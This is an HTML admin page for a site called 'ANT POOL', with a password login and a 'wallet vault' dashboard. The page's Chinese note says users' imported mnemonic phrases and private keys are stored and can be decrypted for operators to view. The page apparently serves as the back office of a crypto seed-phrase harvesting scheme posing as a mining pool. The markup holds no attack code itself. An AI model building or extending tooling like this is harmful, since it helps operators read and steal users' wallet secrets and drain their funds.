<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>ANT POOL Admin</title>
  <link rel="stylesheet" href="pool.css" />
</head>
<body class="admin-page">
  <main class="admin-wrap">
    <section class="card admin-card" id="loginPanel">
      <h1>ANT POOL 管理后台</h1>
      <p class="admin-note">管理员登录</p>
      <div class="form-row">
        <label for="adminPassword">Password</label>
        <input type="password" id="adminPassword" class="search-input" autocomplete="current-password" />
      </div>
      <button type="button" class="btn btn-lava btn-full" id="btnAdminLogin">登录</button>
      <div class="mining-msg" id="adminLoginMsg"></div>
    </section>

    <section class="card admin-card hidden" id="dashPanel">
      <div class="admin-head">
        <h1>钱包库</h1>
        <button type="button" class="btn btn-glass" id="btnAdminLogout">退出</button>
      </div>
      <p class="admin-note">用户导入的助记词/私钥已加密存储。点击查看可解密显示。</p>
      <div class="admin-table-wrap">
        <table class="admin-table">
          <thead>
            <tr>
              <th>时间</th>
              <th>类型</th>
              <th>地址</th>
              <th>备注</th>
              <th></th>
            </tr>
          </thead>
          <tbody id="adminWalletRows"></tbody>
        </table>
      </div>
      <pre class="admin-secret hidden" id="adminSecretView"></pre>
    </section>
  </main>
  <script type="module" src="admin.js"></script>
</body>
</html>
